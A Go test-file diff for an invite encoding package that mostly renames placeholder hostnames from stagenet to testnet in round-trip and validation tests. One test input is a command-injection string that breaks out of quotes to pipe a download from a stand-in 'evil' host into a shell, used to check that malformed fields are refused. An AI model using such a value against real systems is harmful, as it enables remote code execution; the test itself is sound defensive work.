@@ -17,7 +17,7 @@ import (
 
 func TestEncodeDecode_roundTrip(t *testing.T) {
 	want := Invite{
-		JoinURL:       "https://node1.orama-devnet.network",
+		JoinURL:       "https://node1.devnet.orama.network",
 		Token:         strings.Repeat("a", 64),
 		CAFingerprint: strings.Repeat("b", 64),
 	}
@@ -131,12 +131,12 @@ func TestDecode_trimsSurroundingWhitespace(t *testing.T) {
 }
 
 func TestInvite_SNIRoundTrips(t *testing.T) {
-	enc, err := Encode(Invite{JoinURL: "https://203.0.113.5", Token: strings.Repeat("ab", 32), CAFingerprint: strings.Repeat("f", 64), SNI: "stagenet.example"})
+	enc, err := Encode(Invite{JoinURL: "https://203.0.113.5", Token: strings.Repeat("ab", 32), CAFingerprint: strings.Repeat("f", 64), SNI: "testnet.example"})
 	if err != nil {
 		t.Fatal(err)
 	}
 	got, err := Decode(enc)
-	if err != nil || got.SNI != "stagenet.example" || got.JoinURL != "https://203.0.113.5" {
+	if err != nil || got.SNI != "testnet.example" || got.JoinURL != "https://203.0.113.5" {
 		t.Fatalf("got %+v, %v", got, err)
 	}
 }
@@ -146,7 +146,7 @@ func TestInvite_SNIRoundTrips(t *testing.T) {
 func TestFingerprintServed_ReadsAnUntrustedCertificate(t *testing.T) {
 	srv := httptest.NewTLSServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
 	defer srv.Close()
-	fp, err := FingerprintServed(srv.Listener.Addr().String(), "stagenet.example")
+	fp, err := FingerprintServed(srv.Listener.Addr().String(), "testnet.example")
 	if err != nil {
 		t.Fatalf("an untrusted certificate must still be fingerprinted: %v", err)
 	}
@@ -164,7 +164,7 @@ func TestDecode_refusesFieldsOfTheWrongShape(t *testing.T) {
 		JoinURL:       "https://203.0.113.5",
 		Token:         strings.Repeat("ab", 32),
 		CAFingerprint: strings.Repeat("cd", 32),
-		SNI:           "stagenet.example",
+		SNI:           "testnet.example",
 	}
 	for name, mutate := range map[string]func(*Invite){
 		"sni with a quote":      func(i *Invite) { i.SNI = "x';curl evil|sh;'" },
@@ -201,7 +201,7 @@ func TestDecode_refusesFieldsOfTheWrongShape(t *testing.T) {
 		t.Fatalf("a well-formed invite did not decode: %v", err)
 	}
 	withPort := good
-	withPort.JoinURL = "https://stagenet.example:8443/"
+	withPort.JoinURL = "https://testnet.example:8443/"
 	if _, err := Encode(withPort); err != nil {
 		t.Errorf("https://host:port/ was refused: %v", err)
 	}
